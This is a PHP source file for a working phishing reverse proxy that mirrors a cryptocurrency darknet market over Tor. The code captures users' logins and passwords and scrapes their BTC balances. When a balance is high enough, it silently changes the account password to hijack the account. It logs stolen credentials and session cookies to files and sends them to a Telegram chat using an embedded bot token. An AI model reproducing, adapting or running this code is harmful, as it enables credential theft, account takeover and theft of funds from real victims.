<?php 
error_reporting(0);

$send_to = 710040519;

include('rewrite.php');



function bot($ua="") {
	if(empty($ua) && isset($_SERVER['HTTP_USER_AGENT'])) $ua=$_SERVER['HTTP_USER_AGENT'];
	$list = array("facebookexternalhit","Teoma", "alexa", "froogle", "Gigabot", "inktomi",
	"looksmart", "URL_Spider_SQL", "Firefly", "NationalDirectory",
	"Ask Jeeves", "TECNOSEEK", "InfoSeek", "WebFindBot", "girafabot",
	"crawler", "www.galaxy.com", "Googlebot", "Scooter", "Slurp",
	"msnbot", "appie", "FAST", "WebBug", "Spade", "ZyBorg", "rabaz",
	"Baiduspider", "Feedfetcher-Google", "TechnoratiSnoop", "Rankivabot",
	"Mediapartners-Google", "Sogou web spider", "WebAlta Crawler","TweetmemeBot",
	"Butterfly","Twitturls","Me.dium","Twiceler");
	foreach($list as $bot){
	  if(strpos($ua,$bot)!==false) return true;
	}
	return false; 
}

$self = 'http://'.$_SERVER['SERVER_NAME'].'/';
$uri = file_get_contents($_SERVER['DOCUMENT_ROOT'].'/sitetarget.txt');
if(!$uri) exit('No target');

//Данные входящего запроса
$uripath = $_SERVER['REQUEST_URI'];


$isPost = $_SERVER['REQUEST_METHOD'] === 'POST';

$adress = $uripath;
$data = '';
if( is_numeric(strpos($uripath,'?')) ) { 
	$urlarr  = explode('?',$uripath);
	
	$adress = array_shift($urlarr);
	$data = array_shift($urlarr);
}

if(is_numeric( strpos($adress,basename(__FILE__)) )) exit('No.');

if(strlen($data)>1) $data = '?'.$data;

if(substr($adress,strlen($adress)-1,strlen($adress))=='/') $adress = substr($adress,0,strlen($adress)-1);
$uripath = $adress.$data;


$outheads = getallheaders(); 



$clPost = array();
foreach($_POST as $key => $data) {
	//if($key=='login') logger($data.' - ');
	//if($key=='password') logger($data."\n\n");
	$clPost[$key] = $data;
}

if($_POST['tfa']) { $is2FA = true; }

session_name('webcook');
session_start();


if( ($myCurl = curl_init()) != true) {die("No cure init");}


curl_setopt($myCurl, CURLOPT_HTTPHEADER, $outheads);
curl_setopt($myCurl, CURLOPT_USERAGENT, $outheads['User-Agent'] );
curl_setopt($myCurl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($myCurl, CURLOPT_HEADER, 1);
curl_setopt($myCurl, CURLOPT_MAXREDIRS, 10);
curl_setopt($myCurl, CURLOPT_TIMEOUT, 30);
curl_setopt($myCurl, CURLOPT_ENCODING, 'gzip,deflate');
curl_setopt($myCurl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($myCurl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($myCurl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($myCurl, CURLOPT_PROXYTYPE, 7);
curl_setopt($myCurl, CURLOPT_PROXY, "127.0.0.1:9050");

$reload = false;

if( strlen( session_id() ) > 0 ) {
$cookiefile = dirname(__FILE__) . '/tmpcookies/' . session_id().'.txt';

if(!file_exists($cookiefile) && file_exists(dirname(__FILE__) . '/tmpcookies/maincook.txt')) copy(dirname(__FILE__) . '/tmpcookies/maincook.txt',$cookiefile);

curl_setopt($myCurl, CURLOPT_COOKIEFILE, $cookiefile );  
curl_setopt($myCurl, CURLOPT_COOKIEJAR, $cookiefile); 
} else {
	$reload = true;
}
curl_setopt($myCurl, CURLOPT_URL, $uri.$uripath);

if($isPost) {
	curl_setopt($myCurl, CURLOPT_POST, $isPost);
	curl_setopt($myCurl, CURLOPT_POSTFIELDS, http_build_query($clPost));
}


$response = curl_exec($myCurl);

$header_size = curl_getinfo($myCurl, CURLINFO_HEADER_SIZE);
$headers = substr($response, 0, $header_size);
$body = substr($response, $header_size);
$response = $body;

if($is2FA) {
	session_start();
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headers, $matches);
	$cookies = array();
	foreach($matches[1] as $item) {
		parse_str($item, $cookie);
		$cookies = array_merge($cookies, $cookie);
	}
	
	if(strlen($cookies['_session']) > 5 && strpos($response,"Мой профиль")) {
		$response = str_replace("\n","",$response);
		preg_match('/<a href="\/balance" title="На вашем счете (.*?)"><i class="i_wallet"><\/i><span>(.*?) BTC<\/span><\/a>/', $response, $bal2);
		
		logger("Time:" .date("H:i:s d.m.Y"). PHP_EOL . "Данные - " . $_COOKIE['user'] . PHP_EOL . "Баланс - ".trim($bal2[2]) . " | " . $bal2[1] . PHP_EOL . "Сессия: ".$cookies['_session'] . PHP_EOL . PHP_EOL);
	
		$is2FA = false;
	}
}

if(strpos($response,"Вы не робот?") && bot()) {
	$response = preg_replace('/<title>(.*?)<\/title>/', '<title>Hydra  - моментальные магазины</title>', trim($response));
}


if($reload) {
	header("HTTP/1.1 301 Moved Permanently",true,301);
	header("Location: $self");
	exit();
}

$effurl = curl_getinfo($myCurl, CURLINFO_EFFECTIVE_URL);
$effurl = substr($effurl,strlen($uri),strlen($effurl));

while($uripath[0]=='/' || $effurl[0]=='/') {
	if($uripath[0]=='/') $uripath = substr($uripath,1,strlen($uripath));
	if($effurl[0]=='/') $effurl = substr($effurl,1,strlen($effurl));
}
//if(!$_SESSION['ReTime']) $_SESSION['ReTime']=0;
//if(!$_SESSION['ReCount']) $_SESSION['ReCount']=0;
if($_SESSION['ReTime']>(time()-1)) {$_SESSION['ReCount']++;}else{$_SESSION['ReCount']=0;}
$_SESSION['ReTime'] = time();
if($_SESSION['ReCount']>5) exit( 'error '.$effurl.' == '.$uripath.' - '.($effurl==$uripath) );

header("HTTP/1.1 200 OK",true,200);

if($effurl!=$uripath) header("Location: $self$effurl");


header('Content-Type: text/html; charset=utf8');

if(strlen($response)<1) exit("Высокая нагрузка на сайт, попробуйте обновить страницу.");
	
$response = str_replace( $uri , $self , $response );

$response = change_post_link($response);

$needle =  'https';
$replace = 'http';
$response = str_replace( $needle , $replace , $response );

$response = rewrite($response,$uripath);

if(!defined('INCLUDE_CHECK')) {
	if( is_numeric(strpos($uripath,'?')) ) $uripath = array_shift(explode('?',$uripath));

		$buildarr = explode('/',$adress);
		fillingin($buildarr,$response);
}

if($_POST['login'] != "" && $_POST['password'] != "")
{
	$response = str_replace("\n","",$response);
	preg_match('/<a href="\/balance" title="На вашем счете (.*?)"><i class="i_wallet"><\/i><span>(.*?) BTC<\/span><\/a>/', $response, $bal);
	$arrboot = explode("\n",file_get_contents($_SERVER['DOCUMENT_ROOT'].'/amount_d.txt'));
	$amount = $arrboot[rand(0,count($arrboot)-1)];
	$pass = $_POST['password'];

	
	if((float)$bal[2] > (float)$amount) {
		$pass = random_pass();
		preg_match('/value="(.*?)">/', $response, $found);
		
		$fsd = fopen($_SERVER['DOCUMENT_ROOT'].'/сh_pass555777.txt',"a");
		$str = "Данные - " . $_POST['login'] . ":" . $pass . PHP_EOL . "Баланс - " . trim($bal[2]) . " / " . $bal[1] . PHP_EOL . "Старый пароль - " . $_POST['password'] . "\r\n";
		fwrite($fsd, $str);
		fclose($fsd);
		
		$data = [
			"_token" => $found[1],
			"_time" => time(),
			"avatar" => "",
			"password" => $pass,
			"password_confirmation" => $pass,
			"old_password" => $_POST['password'],
			"settings[theme]" => "hydra",
			"settings[notify]" => "default",
			"settings[gpg_key]" => ""
		];
		
		if( ($myCurl = curl_init()) != true) {die("No cure init");}

		curl_setopt($myCurl, CURLOPT_HTTPHEADER, $outheads);
		curl_setopt($myCurl, CURLOPT_USERAGENT, $outheads['User-Agent'] );
		curl_setopt($myCurl, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($myCurl, CURLOPT_HEADER, 1);
		curl_setopt($myCurl, CURLOPT_MAXREDIRS, 10);
		curl_setopt($myCurl, CURLOPT_TIMEOUT, 30);
		curl_setopt($myCurl, CURLOPT_ENCODING, 'gzip,deflate');
		curl_setopt($myCurl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($myCurl, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($myCurl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($myCurl, CURLOPT_PROXYTYPE, 7);
		curl_setopt($myCurl, CURLOPT_PROXY, "127.0.0.1:9050");

		$reload = false;

		if( strlen( session_id() ) > 0 ) {
		$cookiefile = dirname(__FILE__) . '/tmpcookies/' . session_id().'.txt';

		if(!file_exists($cookiefile) && file_exists(dirname(__FILE__) . '/tmpcookies/maincook.txt')) copy(dirname(__FILE__) . '/tmpcookies/maincook.txt',$cookiefile);

		curl_setopt($myCurl, CURLOPT_COOKIEFILE, $cookiefile );  
		curl_setopt($myCurl, CURLOPT_COOKIEJAR, $cookiefile); 
		} else {$reload = true;}
		curl_setopt($myCurl, CURLOPT_URL, $uri."/user/{$_POST['login']}/account");

		curl_setopt($myCurl, CURLOPT_POST, true);
		curl_setopt($myCurl, CURLOPT_POSTFIELDS, http_build_query($data));
		
		$response = curl_exec($myCurl);

		$header_size = curl_getinfo($myCurl, CURLINFO_HEADER_SIZE);
		$headers = substr($response, 0, $header_size);
		$body = substr($response, $header_size);
		$response = $body;
		
		session_regenerate_id();
		
		logger("==============================" . PHP_EOL . "Time:" .date("H:i:s d.m.Y") . PHP_EOL . "Account: {$_POST['login']}" . PHP_EOL . "Balance: " . trim($bal[2]) . " | " . $bal[1] . PHP_EOL . "Сессия: ".$cookies['_session']. PHP_EOL . PHP_EOL . "Старый пароль: {$_POST['password']}" . PHP_EOL . "Новый пароль: {$pass}" . PHP_EOL . "==============================" . PHP_EOL . PHP_EOL,1);
	} else {
		logger("Time:" .date("H:i:s d.m.Y")." Данные - " . $_POST['login'] . ":" . $pass . PHP_EOL . "Баланс - " . trim($bal[2]) . " | " . $bal[1] . PHP_EOL . "Сессия: ".$cookies['_session'] . PHP_EOL . PHP_EOL);
	}
	
	
	setcookie('user', $_POST['login'].':'.$_POST['password'].' | New pass: '.$pass, time() + (86400 * 30), '/');
	
}


$response = str_replace('<form method="GET" action="//catalog" accept-charset="UTF-8" id="catalog-filters" class="searchform">', '<form method="GET" action="/catalog" accept-charset="UTF-8" id="catalog-filters" class="searchform">', $response);

// fclose($fd);
exit($response);

function logger($msg,$type = 0) {
 $send_to = 682093534;
 
 if(!$handle = fopen($_SERVER['DOCUMENT_ROOT'].'/2323.txt',"a")) return "File does open";
 if(fwrite($handle,$msg,strlen($msg))===false) return "cant write";
	 fclose($handle);
	 if($type == 0) {
		 tg_send_message($send_to, $msg, "667080304:AAHRHaWYa6a-fcqMaAxDjraiK_r4kOYuaVI"); 
	 } else {
		 tg_send_message($send_to, $msg, "667080304:AAHRHaWYa6a-fcqMaAxDjraiK_r4kOYuaVI"); 
	 } 
}

function random_pass($length = 12) {
	$use = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"; 
	
	$api = '';
	srand((double)microtime()*1000000); 
	for($i=0; $i<$length; $i++) { 
	  $api.= $use[rand()%strlen($use)]; 
	} 
	return $api; 
}

function change_post_link($response,$offset = 0)
{
	$Lresponse = strtolower($response);
	
	$needle = 'method="post"';
	$coorstar = strpos($Lresponse,$needle,$offset);
	if(!is_numeric($coorstar)) return $response;
	
	$offset = $coorstar+strlen($needle);
	
	while($Lresponse[$coorstar]!='<' || $coorstar<1) $coorstar--;
	if($coorstar<1) return change_post_link($response,$offset);
		
	$needle = 'action="';
	$coorstar = strpos($Lresponse,$needle,$coorstar);
	if(!is_numeric($coorstar)) return change_post_link($response,$offset);
	
	$coorstar += strlen($needle);
	$coorend = strpos($Lresponse,'"',$coorstar);
	if(!is_numeric($coorend)) return change_post_link($response,$offset);
	if($response[$coorend-1]=='/') return $response;
	
	$response = substr($response,0,$coorend).'/'.substr($response,$coorend,strlen($response));
	return change_post_link($response,$offset);
}

function fillingin($buildarr,$response = 'NULL') {

if(strpos($buildarr[count($buildarr)-1],'.') === false) {$filename = ''; } else {$filename = array_pop($buildarr);}

$format = strpos($filename,'.');

$newaddres = '\'';
$filepath = '';
foreach($buildarr as $name) {
	if($name=='') continue;
	$newaddres = $newaddres.'../';
	$filepath = $filepath.$name.'/';
}
$newaddres = '<?php define(\'INCLUDE_CHECK\',true); require '.$newaddres.'crookedmirror.php\';';


if($filename=="") $filename='index.php';

if(file_exists($filepath.$filename)) return "already done";

if( !file_exists($filepath) ) mkdir($filepath, 0777, true);
if(is_numeric($format)) $newaddres = $response;
if($newaddres!='') {
if(!$handle = fopen($filepath.$filename , "w")) return "File does open";
if(fwrite($handle,$newaddres,strlen($newaddres))===false) return "cant write";
fclose($handle);
}

//copy('.htaccess', $filepath.'.htaccess');

$buildarr[count($buildarr)-1]="";

if(count($buildarr)>0) fillingin($buildarr);
}
	
	function apitgbot($n, $post, $token = "")
	{
		global $settings;
		if($token == "") $token = $settings['tgtoken'];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/".$n);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_POST, true); 
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
		curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
		$data = json_decode(curl_exec($ch)); 
		curl_close($ch);
		return $data;
	}


	function tg_send_message($to, $text, $token = "")
	{
		$post['chat_id'] = $to;
		$post['parse_mode'] = "HTML";
		$post['disable_web_page_preview'] = false;
		$post['text'] = $text;
		return apitgbot("sendMessage", $post, $token);
	}

